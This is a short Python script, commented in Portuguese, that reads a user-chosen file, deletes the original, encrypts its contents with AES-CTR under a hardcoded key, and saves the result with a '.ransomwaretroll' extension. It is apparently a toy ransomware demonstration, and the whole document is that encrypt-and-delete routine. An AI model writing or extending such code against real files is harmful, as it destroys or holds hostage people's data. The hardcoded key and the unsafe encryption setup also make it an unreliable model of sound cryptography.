import os
import pyaes

## abrir o arquivo a ser criptografado
file_path = input("Type the file which you want to cryptograph\n")
file = open(file_path, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_path)

## chave de criptografia
key = b"chavede16digitos"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_path + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()